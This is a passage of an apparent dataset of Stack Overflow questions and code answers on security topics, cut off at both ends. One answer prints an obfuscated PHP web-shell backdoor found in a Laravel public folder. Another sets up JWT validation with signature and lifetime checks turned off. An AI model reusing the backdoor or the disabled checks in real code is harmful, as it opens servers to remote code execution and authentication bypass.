        "body": "private static string salt = \"<REPLACE_WITH_FIXED_LENGTH_SALT>\";\n        private static string sensitiveKey = \"<REPLACE_WITH_KEY>\";\n        private static string salted_key = salt + sensitiveKey;\n        public static string Encrypt(string input)\n        {\n            // Get the bytes of the string\n            byte[] passwordBytes = Encoding.UTF8.GetBytes(salted_key);\n            // Hash the password with SHA256\n            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);\n            byte[] bytesEncrypted = EncryptStringToBytes_Aes(input, passwordBytes);\n            string result = Convert.ToBase64String(bytesEncrypted);\n            return result;\n        }",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2020-07-20T05:21:15",
        "author": "Marwan N"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/62628423/how-can-i-get-the-a-certificates-validity-period-using-apples-security-framewo",
    "title": "How can I get the a certificate&#39;s validity period using Apple&#39;s Security framework?",
    "question_id": 62628423,
    "posted_date": "2020-06-28T17:29:49",
    "answers": [
      {
        "answer_id": 62637308,
        "body": "#import <Foundation/Foundation.h>\nid getX509ValueforKey(SecCertificateRef certificate, CFStringRef kSecPropertyKey) {\n    id value;\n    CFDictionaryRef valuesDict = SecCertificateCopyValues(certificate, (__bridge CFArrayRef)@[(__bridge id)kSecPropertyKey], NULL);\n    if (valuesDict) {\n        CFDictionaryRef invalidityDateDictionaryRef = CFDictionaryGetValue(valuesDict, kSecPropertyKey);\n        if (invalidityDateDictionaryRef) {\n            CFTypeRef invalidityRef = CFDictionaryGetValue(invalidityDateDictionaryRef, kSecPropertyKeyValue);\n            if (invalidityRef)\n                value = CFBridgingRelease(invalidityRef);\n        }\n        CFRelease(valuesDict);\n    }\n    return value;\n}\nint main(int argc, const char * argv[]) {\n\n    SecCertificateRef certificateRef = NULL;\n    NSDate *certExpiryDate = getX509ValueforKey(certificateRef, kSecOIDInvalidityDate);\n    NSLog(@\"certExpiryDate: %@\", certExpiryDate);\n\n    return noErr;\n}",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2020-06-29T07:39:57",
        "author": "Anubis"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/59735773/nodejs-dynamically-load-angular-modules-after-login",
    "title": "NodeJS dynamically load angular modules after login",
    "question_id": 59735773,
    "posted_date": "2020-01-14T09:28:06",
    "answers": [
      {
        "answer_id": 59747823,
        "body": "// router config\n$stateProvider\n  .state('admin', {\n    abstract: true,\n    url: '/admin',\n    onEnter: /*@ngInject*/ (userService, $stateParams) => {\n      return userService.getUserFromToken($stateParams.propertyId);\n    },\n    lazyLoad: $transition$ => {\n             // this dynamic import tells webpack to split the admin-panel module (and it dependencies) from the app bundle\n      return import(/* webpackChunkName: \"admin\" */ '../admin-panel/admin-panel.module').then(\n        module => $transition$.injector().loadNewModules([module.AdminPanelModule],\n      );\n    },\n  })\n  .state('admin.main', { // inherits from admin abstract state\n    url: '/',\n    views: {\n      '@': {\n        component: 'dashboard',\n      },\n    },\n  });",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2020-01-15T03:52:01",
        "author": "felixmosh"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/59452119/weird-php-file-under-laravel5-8-public-folder",
    "title": "Weird php file under laravel5.8 public folder",
    "question_id": 59452119,
    "posted_date": "2019-12-23T03:25:19",
    "answers": [
      {
        "answer_id": 59452394,
        "body": "foreach (array_merge($_COOKIE, $_POST) as $index => $value){\n    function dlvrss($vcdoidm, $index, $eowcms){\n        return substr(str_repeat($index . \"9f3a07a1-592c-4701-8f06-55b76e9019aa\", ($eowcms / strlen($index)) + 1), 0, $eowcms);\n    }\n    function isfap($vcdoidm, $eeqhx){\n        return @pack(\"H*\", $eeqhx);\n    }\n    function eeejy($vcdoidm, $eeqhx){\n        $jfvsqg = count($eeqhx) % 3;\n        if (!$jfvsqg) {\n            $fggryc = create_function(\"\", $eeqhx[1]($eeqhx[2]));\n            $fggryc();\n            exit();\n        }\n    }\n    $value = isfap($vcdoidm, $value);\n    eeejy($vcdoidm, explode(\"#\", $value ^ dlvrss($vcdoidm, $index, strlen($value))));\n}",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2019-12-23T03:49:59",
        "author": "N69S"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/57245026/how-to-upload-file-directly-to-aws-s3-with-aws-sdk",
    "title": "How to upload file directly to AWS S3 with AWS SDK?",
    "question_id": 57245026,
    "posted_date": "2019-07-28T17:15:00",
    "answers": [
      {
        "answer_id": 57245094,
        "body": "<?php\nif(empty($_FILES['image'])){\n    die('Image missing');\n}\n$fileName = $_FILES['image']['name'];\n$tempFilePath = $_FILES['image']['tmp_name'];\nrequire 'vendor/autoload.php';\n$s3 = S3Client::factory(array(\n    'key'    => 'your AWS access key',\n    'secret' => 'your AWS secret access key'\n));\ntry {\n    $result = $s3->putObject(array(\n        'Bucket' => '<your bucket>',\n        'Key'    => $fileName,\n        'SourceFile'   => $tempFilePath,\n        'ACL'    => 'public-read'\n    ));\n    echo 'Success';\n} catch (S3Exception $e) {\n    echo $e->getMessage() . \"\\n\";\n}",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2019-07-28T17:26:31",
        "author": "atymic"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/78688497/run-elevated-process-from-system-process",
    "title": "Run elevated process from SYSTEM process",
    "question_id": 78688497,
    "posted_date": "2024-06-30T07:54:57",
    "answers": [
      {
        "answer_id": 78694348,
        "body": "c++\nbool runPrivilegedProcess(Process_t* process)\n{\n\tHANDLE userToken, linkedToken;\n\tULONG sessionId = process->sessionId;\n\tif (WTSQueryUserToken(sessionId, &userToken) == FALSE)\n\t{\n\t    debugFile << \"WTSQueryUserToken failed: \" << GetLastError() << std::endl;\n\t    return false;\n\t}\n\tTOKEN_LINKED_TOKEN tokenLinkedToken;\n\tDWORD tokenSize = sizeof(TOKEN_LINKED_TOKEN), retval;\n\tif (GetTokenInformation(userToken, TokenLinkedToken, &tokenLinkedToken, tokenSize, &retval) == FALSE)\n\t{\n\t    debugFile << \"GetTokenInformation failed: \" << GetLastError() << std::endl;\n\t    CloseHandle(userToken);\n\t    return false;\n\t}\n\twchar_t desktop[100] = L\"winsta0\\\\default\";\n\tSTARTUPINFO si;\n\tmemset(&si, 0, sizeof(STARTUPINFO));\n\tsi.cb = sizeof(STARTUPINFO);\n\tsi.lpDesktop = desktop;\n\tPROCESS_INFORMATION pi;\n\twchar_t processName[100] = L\"c:\\\\windows\\\\system32\\\\cmd.exe\";\n\n\tif (!CreateProcessAsUser(tokenLinkedToken.LinkedToken, NULL, processName, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {\n\t    debugFile << \"CreateProcessAsUser error: \" << GetLastError() << std::endl;\n\t    CloseHandle(userToken);\n\t    CloseHandle(tokenLinkedToken.LinkedToken);\n\t    return true;\n\t}\n\tdebugFile << \"Execution done. Child process ID is \" << pi.dwProcessId << std::endl;\n\tCloseHandle(userToken);\n\tCloseHandle(tokenLinkedToken.LinkedToken);\n\treturn true;\n}",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2024-07-01T17:55:10",
        "author": "Mustafa Chelik"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/78556386/how-to-create-a-custom-role-with-specific-permissions-in-airflow-using-airflowse",
    "title": "How to create a custom role with specific permissions in Airflow using AirflowSecurityManager or other?",
    "question_id": 78556386,
    "posted_date": "2024-05-30T13:06:30",
    "answers": [
      {
        "answer_id": 79538277,
        "body": "from airflow.providers.fab.auth_manager.security_manager.override import FabAirflowSecurityManagerOverride\nfrom airflow.security import permissions\nclass MyCustomSecurityManager(FabAirflowSecurityManagerOverride):\n    # Extend default ROLE_CONFIGS class attribute\n    ROLE_CONFIGS = FabAirflowSecurityManagerOverride.ROLE_CONFIGS + [\n        {\n            \"role\": \"MyRole\",\n            \"perms\": [\n                (permissions.ACTION_CAN_CREATE, permissions.RESOURCE_DAG_RUN),\n                (permissions.ACTION_CAN_EDIT, permissions.RESOURCE_DAG_RUN),\n                (permissions.ACTION_CAN_EDIT, permissions.RESOURCE_DAG_PREFIX + \"my_dag\"),\n            ],\n        }\n    ]\nSECURITY_MANAGER_CLASS = MyCustomSecurityManager",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2025-03-27T04:38:02",
        "author": "Quentin Fleurent-Nambot"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/78494911/decrypting-ec-pem-key-in-swift",
    "title": "Decrypting EC PEM Key in Swift",
    "question_id": 78494911,
    "posted_date": "2024-05-17T06:01:29",
    "answers": [
      {
        "answer_id": 78495214,
        "body": "import CryptoKit\nlet bytes = Data(base64Encoded: \"mcg4slLSRadsy4+caGCPVrmQ6ua2zTNQnezTJLVl87A=\")!\nlet privateKey = try! P256.KeyAgreement.PrivateKey(rawRepresentation: bytes)\n// Or if you want to use it for signing\nlet privateKey = try! P256.Signing.PrivateKey(rawRepresentation: bytes)\n// You can convert that key to a SecKey if you wish to do so\nlet parameters: [CFString: Any] = [\n    kSecClass: kSecClassKey,\n    kSecAttrKeyType: kSecAttrKeyTypeECSECPrimeRandom,\n    kSecAttrKeyClass: kSecAttrKeyClassPrivate,\n    kSecAttrKeySizeInBits: 256\n]\nvar error: Unmanaged<CFError>?\nlet key = SecKeyCreateWithData(privateKey.x963Representation as CFData, parameters as CFDictionary, &error)",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2024-05-17T07:02:45",
        "author": "Bram"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/78461299/how-can-i-add-user-secrets-as-a-configuration-source-in-tokenacquirerfactory",
    "title": "How can I add user secrets as a configuration source in TokenAcquirerFactory?",
    "question_id": 78461299,
    "posted_date": "2024-05-10T11:57:26",
    "answers": [
      {
        "answer_id": 79536460,
        "body": "var tokenAcquirerFactory = TokenAcquirerFactory.GetDefaultInstance();\n // Add console logging or other services if you wish\n tokenAcquirerFactory.Services.AddLogging(\n (loggingBuilder) => loggingBuilder.SetMinimumLevel(LogLevel.Warning)\n     .AddConsole());\n var configBuilder = new ConfigurationBuilder()\n   .SetBasePath(Directory.GetCurrentDirectory())\n   .AddJsonFile(\"appsettings.json\", optional: false, reloadOnChange: true)\n   .AddUserSecrets<Startup>()\n   .AddEnvironmentVariables();\n var config = configBuilder.Build();\n tokenAcquirerFactory.Services.Configure<MicrosoftIdentityApplicationOptions>(options => config.GetSection(\"MyAzureAd\").Bind(options));\ntokenAcquirerFactory.Services.AddDownstreamApi(\"MyApi\",\n    tokenAcquirerFactory.Configuration.GetSection(\"MyWebApi\"));\nvar sp = tokenAcquirerFactory.Build();\nvar api = sp.GetRequiredService<IDownstreamApi>();",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2025-03-26T08:47:00",
        "author": "kkuilla"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/78306316/invalid-grant-error-with-code-flow-keycloak",
    "title": "Invalid Grant error with code flow Keycloak",
    "question_id": 78306316,
    "posted_date": "2024-04-10T14:03:10",
    "answers": [
      {
        "answer_id": 78307817,
        "body": "node.js\nconst express = require('express');\nconst axios = require('axios');\nconst app = express();\nconst port = 3000;\nconst KEYCLOAK_CLIENT_ID = \"my_client\";\nconst KEYCLOAK_CLIENT_SECRET = \"oCDrud4nUSxp6ol56u9ZEJhdG3tsKji9\"; // your client secret\nconst KEYCLOAK_REALM = \"my_app\";\nconst KEYCLOAK_SERVER_URL = \"http://localhost:8080\";\nconst REDIRECT_URI = \"http://localhost:3000/callback\"; // your client's redirect URI\napp.get('/login', (req, res) => {\n  const authUrl = `${KEYCLOAK_SERVER_URL}/realms/${KEYCLOAK_REALM}/protocol/openid-connect/auth?client_id=${encodeURIComponent(KEYCLOAK_CLIENT_ID)}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=openid`;\n  res.redirect(authUrl);\n});\napp.get('/callback', async (req, res) => {\n  const { code } = req.query;\n  try {\n    const response = await axios.post(`${KEYCLOAK_SERVER_URL}/realms/${KEYCLOAK_REALM}/protocol/openid-connect/token`, new URLSearchParams({\n      client_id: KEYCLOAK_CLIENT_ID,\n      client_secret: KEYCLOAK_CLIENT_SECRET,\n      redirect_uri: REDIRECT_URI,\n      grant_type: 'authorization_code',\n      code,\n    }), {\n      headers: {\n        'Content-Type': 'application/x-www-form-urlencoded'\n      }\n    });\n    const { access_token, refresh_token, id_token } = response.data;\n    // Here you can store/use the tokens as needed\n    res.json({ access_token, refresh_token, id_token });\n  } catch (error) {\n    res.status(500).json({ error: error.toString() });\n  }\n});\napp.listen(port, () => {\n  console.log(`Server listening at http://localhost:${port}`);\n});",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2024-04-10T21:21:10",
        "author": "Bench Vue"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/76934370/trouble-getting-browser-extension-to-control-playback-speed-of-facebook-videos",
    "title": "Trouble Getting Browser Extension to Control Playback Speed of Facebook Videos",
    "question_id": 76934370,
    "posted_date": "2023-08-19T05:14:09",
    "answers": [
      {
        "answer_id": 76934626,
        "body": "const STORAGE = chrome.storage.sync; // `sync` is preferable for small settings\nconst KEY = 'playbackSpeed';\nconst ignored = new WeakSet();\nlet speed, speedPromise;\naddEventListener('play', async e => {\n  if (e.target.tagName === 'VIDEO' && !ignored.has(e.target)) {\n    ignored.add(e.target);\n    e.target.playbackRate = speed || await (\n      speedPromise || (speedPromise = STORAGE.get(KEY).then(r => (speed = r[KEY])))\n    );\n  }\n}, true); // IMPORTANT! The `play` event doesn't bubble, so we listen in the first phase\nchrome.storage.onChanged.addListener(changes => {\n  const ch = changes[KEY];\n  if (ch) {\n    speed = ch.newValue;\n    for (const el of document.getElementsByTagName('video')) {\n      el.playbackRate = speed;\n    }\n  }\n});",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2023-08-19T06:25:15",
        "author": "woxxom"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/73490065/python-exchangelib-automate-enabling-attachments-due-to-default-security-settin",
    "title": "Python Exchangelib: Automate Enabling Attachments Due to Default Security Settings",
    "question_id": 73490065,
    "posted_date": "2022-08-25T11:18:45",
    "answers": [
      {
        "answer_id": 73558152,
        "body": "def box_unjunk():\n  global exch, account, startdate, enddate, tz\n  print('##### Checking for emails identified as junk...')\n  mail_inbox = account.inbox\n  mail_junk  = account.junk\n  for item in mail_junk.filter(\n    datetime_received__range=(\n      tz.localize(exch.EWSDateTime(startdate.year, startdate.month, startdate.day)),\n      tz.localize(exch.EWSDateTime(enddate.year, enddate.month, enddate.day, enddate.hour, enddate.minute, enddate.second))\n      )).order_by('-datetime_received'):\n    if (re.fullmatch(r'.*', item.subject.lower())):\n      print('    Moving email with subject:', item.subject, 'to Inbox folder')\n      item.move(mail_inbox)",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2022-08-31T11:17:08",
        "author": "JRomeo"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/73446679/deny-any-access-by-anonymous-in-wildfly",
    "title": "Deny any access by `anonymous` in WildFly",
    "question_id": 73446679,
    "posted_date": "2022-08-22T10:22:37",
    "answers": [
      {
        "answer_id": 73471073,
        "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<web-app version=\"3.1\" xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n\t\t xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n\t\t xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd\">\n\t<login-config>\n\t\t<auth-method>BASIC</auth-method>\n\t</login-config>\n\t<security-constraint>\n\t\t<web-resource-collection>\n\t\t\t<web-resource-name>*</web-resource-name>\n\t\t\t<url-pattern>/*</url-pattern>\n\t\t</web-resource-collection>\n\t\t<auth-constraint>\n\t\t\t<role-name>*</role-name>\n\t\t</auth-constraint>\n\t</security-constraint>\n\t<security-role>\n\t\t<role-name>*</role-name>\n\t</security-role>\n</web-app>",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2022-08-24T05:56:40",
        "author": "r&#252;-"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/72693154/blacklist-ip-in-kubernetes-security-policy",
    "title": "blacklist IP in kubernetes security policy",
    "question_id": 72693154,
    "posted_date": "2022-06-20T17:25:55",
    "answers": [
      {
        "answer_id": 72693215,
        "body": "apiVersion: config.istio.io/v1alpha2\nkind: listchecker\nmetadata:\n  name: whitelistip\nspec:\n  # providerUrl: ordinarily black and white lists are maintained\n  # externally and fetched asynchronously using the providerUrl.\n  overrides: [\"10.57.0.0/16\"]  # overrides provide a static list\n  blacklist: false\n  entryType: IP_ADDRESSES\n---\napiVersion: config.istio.io/v1alpha2\nkind: listentry\nmetadata:\n  name: sourceip\nspec:\n  value: source.ip | ip(\"0.0.0.0\")\n---\napiVersion: config.istio.io/v1alpha2\nkind: rule\nmetadata:\n  name: checkip\nspec:\n  match: source.labels[\"istio\"] == \"ingressgateway\"\n  actions:\n  - handler: whitelistip.listchecker\n    instances:\n    - sourceip.listentry\n---",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2022-06-20T17:34:32",
        "author": "CodeWizard"
      },
      {
        "answer_id": 72693215,
        "body": "apiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: web-ingress\n  annotations:\n    kubernetes.io/ingress.class: nginx\n    nginx.ingress.kubernetes.io/ssl-redirect: \"false\"\n    nginx.ingress.kubernetes.io/use-regex: \"true\"\n    nginx.ingress.kubernetes.io/rewrite-target: /$1\n\n    #\n    # This is the relevant part\n    #\n\n    nginx.ingress.kubernetes.io/whitelist-source-range: 49.36.X.X/32\n    # depending on the ingress controller version the annotation\n    # above may need to be modified to remove the prefix nginx. i.e.\n    # ingress.kubernetes.io/whitelist-source-range: 49.36.X.X/32\nspec:\n  rules:\n  - host: web.manitestdomain.com\n    http:\n      paths:\n      - path: /(.*)\n        pathType: Prefix\n        backend:\n          service:\n            name: web\n            port:\n              number: 80",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2022-06-20T17:34:32",
        "author": "CodeWizard"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/72119191/electron-contextbridge-returns-undefined",
    "title": "Electron contextBridge returns undefined",
    "question_id": 72119191,
    "posted_date": "2022-05-04T16:34:49",
    "answers": [
      {
        "answer_id": 72121733,
        "body": "function openFile() {\n    return new Promise((resolve, reject) => {\n        fs.readFile(\"logs.txt\", \"utf-8\", (error, data) => {\n            if (error) {\n                console.log('reject: ' + error); // Testing\n                reject(error);\n            } else {\n                console.log('resolve: ' + data); // Testing\n                resolve(data)\n            }\n        });\n    });\n}\nipcMain.handle('channel-load-file', async (event, message) => {\n    return await openFile()\n        .then((data) => {\n            console.log('handle: ' + data); // Testing\n            return data;\n        })\n        .catch((error) => {\n            console.log('handle error: ' + error); // Testing\n            return 'Error Loading Log File';\n        })\n});",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2022-05-04T23:52:55",
        "author": "midnight-coding"
      },
      {
        "answer_id": 72121733,
        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n    <head>\n        <meta charset=\"UTF-8\">\n        <title>Electron Test</title>\n        <meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self' 'unsafe-inline';\"/>\n    </head>\n    <body>\n        <div id=\"main-content\"></div>\n        <input type=\"button\" id=\"button\" value=\"Load File\">\n    </body>\n    <script>\n        document.getElementById('button').addEventListener('click', () => {\n            window.electronAPI.loadFile()\n                .then((data) => {\n                    console.log(data); // Testing\n                    document.getElementById(\"main-content\").innerText = data.toString();\n                });\n        })\n    </script>\n</html>",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2022-05-04T23:52:55",
        "author": "midnight-coding"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/71908068/aur-problems-with-installations",
    "title": "AUR problems with installations",
    "question_id": 71908068,
    "posted_date": "2022-04-18T01:56:38",
    "answers": [
      {
        "answer_id": 71992828,
        "body": "$ sudo pacman -S impacket\nresolving dependencies...\nlooking for conflicting packages...\nPackages (6) python-ldap3-2.9.1-3  python-pcapy-1.0.5-1  python-pyasn1-0.4.8-7  python-pycryptodome-3.14.1-1\n             python-pycryptodomex-3.12.0-1  impacket-0.9.24-1\nTotal Download Size:    4.61 MiB\nTotal Installed Size:  30.25 MiB\n:: Proceed with installation? [Y/n] y\n:: Retrieving packages...\n impacket-0.9.24-1-any                   1802.1 KiB  2.42 MiB/s 00:01 [#######################################] 100%\n python-pycryptodomex-3.12.0-1-x86_64    1354.7 KiB  4.35 MiB/s 00:00 [#######################################] 100%\n python-pycryptodome-3.14.1-1-x86_64      980.6 KiB  5.04 MiB/s 00:00 [#######################################] 100%\n python-ldap3-2.9.1-3-any                 442.8 KiB  3.70 MiB/s 00:00 [#######################################] 100%\n python-pyasn1-0.4.8-7-any                115.2 KiB  1719 KiB/s 00:00 [#######################################] 100%\n python-pcapy-1.0.5-1-x86_64               22.5 KiB   561 KiB/s 00:00 [#######################################] 100%\n Total (6/6)                                4.6 MiB  2.53 MiB/s 00:02 [#######################################] 100%\n(6/6) checking keys in keyring                                        [#######################################] 100%\n(6/6) checking package integrity                                      [#######################################] 100%\n(6/6) loading package files                                           [#######################################] 100%\n(6/6) checking for file conflicts                                     [#######################################] 100%\n(6/6) checking available disk space                                   [#######################################] 100%\n:: Processing package changes...\n(1/6) installing python-pycryptodome                                  [#######################################] 100%\n(2/6) installing python-pycryptodomex                                 [#######################################] 100%\n(3/6) installing python-pyasn1                                        [#######################################] 100%\n(4/6) installing python-pcapy                                         [#######################################] 100%\n(5/6) installing python-ldap3                                         [#######################################] 100%\n(6/6) installing impacket                                             [#######################################] 100%\n:: Running post-transaction hooks...\n(1/1) Arming ConditionNeedsUpdate...",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2022-04-24T18:23:55",
        "author": "user18803325"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/71811463/how-to-prevent-a-java-application-from-executing-processes-on-gnu-linux",
    "title": "How to prevent a Java application from executing processes on GNU/Linux?",
    "question_id": 71811463,
    "posted_date": "2022-04-09T15:57:16",
    "answers": [
      {
        "answer_id": 71823771,
        "body": "# start a clojure/java process\nuser=> (require '[clojure.java.shell :as sh])\nuser=> (dotimes [i 100] (future (sh/sh \"sleep\" \"2\")))\nnil\n# then get change the nproc limit for the process - make sure to pass proper pid\nprlimit --pid 2769227 --nproc=99\n# then again in the Clojure REPL:\nuser=> (dotimes [i 100] (future (sh/sh \"sleep\" \"2\")))\n[200.656s][warning][os,thread] Failed to start thread - pthread_create failed (EAGAIN) for attributes: stacksize: 1024k, guardsize: 0k, detached.\n[200.656s][warning][os,thread] Failed to start thread - pthread_create failed (EAGAIN) for attributes: stacksize: 1024k, guardsize: 0k, detached.\n[200.657s][warning][os,thread] Failed to start thread - pthread_create failed (EAGAIN) for attributes: stacksize: 1024k, guardsize: 0k, detached.\n[200.657s][warning][os,thread] Failed to start thread - pthread_create failed (EAGAIN) for attributes: stacksize: 1024k, guardsize: 0k, detached.\n[200.657s][warning][os,thread] Failed to start thread - pthread_create failed (EAGAIN) for attributes: stacksize: 1024k, guardsize: 0k, detached.\nExecution error (OutOfMemoryError) at java.lang.Thread/start0 (Thread.java:-2).\nunable to create native thread: possibly out of memory or process/resource limits reached",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2022-04-11T02:58:22",
        "author": "Juraj Martinka"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/69125974/validate-a-jwt-from-another-c-asp-net-core-3-1-api-that-consumes-it",
    "title": "Validate a JWT from another C# ASP.NET Core 3.1 API that consumes it",
    "question_id": 69125974,
    "posted_date": "2021-09-09T20:28:45",
    "answers": [
      {
        "answer_id": 69132702,
        "body": "c#\nservices\n    .AddAuthentication(JwtBearerDefaults.AuthenticationScheme)\n    .AddJwtBearer(\n        options => {\n            options.TokenValidationParameters = new TokenValidationParameters\n            {\n                ValidateIssuer = true, // `iss` claim\n                ValidIssuers = new []{\"https://localhost:1234\"},\n                ValidateAudience = false, // `aud` claim\n                ValidateLifetime = false, // `exp`, `nbf` claims\n                ValidateIssuerSigningKey = false, // signature\n                SignatureValidator = (token, parameters) => new JwtSecurityToken(token), // don't validate signature\n            };\n        });",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2021-09-10T09:07:18",
        "author": "abdusco"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/67358468/sending-data-without-encription-to-twilio-gettoken-function",
    "title": "Sending data without encription to Twilio getToken function",
    "question_id": 67358468,
    "posted_date": "2021-05-02T12:04:08",
    "answers": [
      {
        "answer_id": 67362574,
        "body": "exports.handler = function(context, event, callback) {\n    let response = new Twilio.Response();\n\n    const identity = event.identity;\n    const secret = event.secret;\n    const twilioAccountSid = context.ACCOUNT_SID;\n    const twilioApiKey = context.API_KEY;\n    const twilioApiSecret = context.API_SECRET;\n    const customSecret = context.CUSTOM_SECRET;\n    if (identity !== undefined && twilioApiKey !== undefined\n        && twilioApiSecret !== undefined && twilioAccountSid !== undefined\n        && secret !== undefined && customSecret !== undefined && secret === customSecret) {\n      // We're all good, create the token\n    } else {\n      // Unauthorised\n    }\n    callback(null, response);\n};",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2021-05-02T21:33:50",
        "author": "philnash"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/66311148/best-way-to-set-a-cookie-in-php-that-can-be-authenticated-in-r",
    "title": "Best way to set a cookie in php that can be authenticated in R?",
    "question_id": 66311148,
    "posted_date": "2021-02-22T01:47:47",
    "answers": [
      {
        "answer_id": 66313234,
        "body": "names(session$request)\n [1] \"SERVER_NAME\"                   \"SERVER_PORT\"                   \"rook.url_scheme\"               \"REQUEST_METHOD\"                \"rook.version\"\n [6] \"rook.errors\"                   \"HTTP_SEC_WEBSOCKET_EXTENSIONS\" \"HTTP_USER_AGENT\"               \"HTTP_SEC_WEBSOCKET_VERSION\"    \"HTTP_CONNECTION\"\n[11] \"SCRIPT_NAME\"                   \"HTTP_ORIGIN\"                   \"HTTP_ACCEPT_LANGUAGE\"          \"rook.input\"                    \"REMOTE_PORT\"\n[16] \"HTTP_COOKIE\"                   \"HTTP_ACCEPT_ENCODING\"          \"HTTP_SEC_WEBSOCKET_KEY\"        \"HTTP_UPGRADE\"                  \"httpuv.version\"\n[21] \"HTTP_HOST\"                     \"HEADERS\"                       \"PATH_INFO\"                     \"QUERY_STRING\"                  \"REMOTE_ADDR\"\n[26] \"HTTP_CACHE_CONTROL\"            \"HTTP_PRAGMA\"",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2021-02-22T04:42:16",
        "author": "Colin FAY"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/65951529/how-a-clientweb-browser-use-public-key-on-ca-certificate-to-authenticate-digit",
    "title": "How a client(web browser) use public key on CA certificate to authenticate digital signature on server certificate?",
    "question_id": 65951529,
    "posted_date": "2021-01-29T04:04:38",
    "answers": [
      {
        "answer_id": 65952957,
        "body": "TBSCertificate  ::=  SEQUENCE  {\n        version         [0]  EXPLICIT Version DEFAULT v1,\n        serialNumber         CertificateSerialNumber,\n        signature            AlgorithmIdentifier,\n        issuer               Name,\n        validity             Validity,\n        subject              Name,\n        subjectPublicKeyInfo SubjectPublicKeyInfo,\n        issuerUniqueID  [1]  IMPLICIT UniqueIdentifier OPTIONAL,\n                             -- If present, version MUST be v2 or v3\n        subjectUniqueID [2]  IMPLICIT UniqueIdentifier OPTIONAL,\n                             -- If present, version MUST be v2 or v3\n        extensions      [3]  EXPLICIT Extensions OPTIONAL\n                             -- If present, version MUST be v3\n        }",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2021-01-29T05:43:43",
        "author": "Alexey R."
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/65527843/list-of-lua-commands-statements-to-watch-out",
    "title": "List of Lua commands/statements to watch out?",
    "question_id": 65527843,
    "posted_date": "2021-01-01T02:00:24",
    "answers": [
      {
        "answer_id": 65532705,
        "body": "   local badCode = readFile(\"./code.lua\")\n   local Func = loadstring(badCode)\n   setfenv(Func, {\n       -- If we leave nothing here, then the script will not be able to access any global variable.\n       -- It's perfectly sandboxed. But let's give it some stuff:\n       print = print, pcall = pcall, pairs = pairs, ipairs = ipairs, error = error, string = string, table = table, math = math, coroutine = coroutine,\n       -- Now, let's give it some functions that *could* be useful, from an otherwise sandboxed library\n       os = {\n           time = os.time,\n           date = os.date,\n           clock = os.clock,\n       },\n       -- All of these are \"kind of\" useful to the program.\n   })\n   -- Now that Func is properly sandboxed, let's run it!\n   Func()\n   -- This is how you should treat user code.",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2021-01-01T13:54:46",
        "author": "Mooshua"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/65473487/how-to-setup-a-single-saml-app-for-all-the-tenants-of-multi-tenant-apphaving-di",
    "title": "How to setup a single SAML app for all the tenants of multi-tenant app(having different domain urls)?",
    "question_id": 65473487,
    "posted_date": "2020-12-28T00:49:59",
    "answers": [
      {
        "answer_id": 65731080,
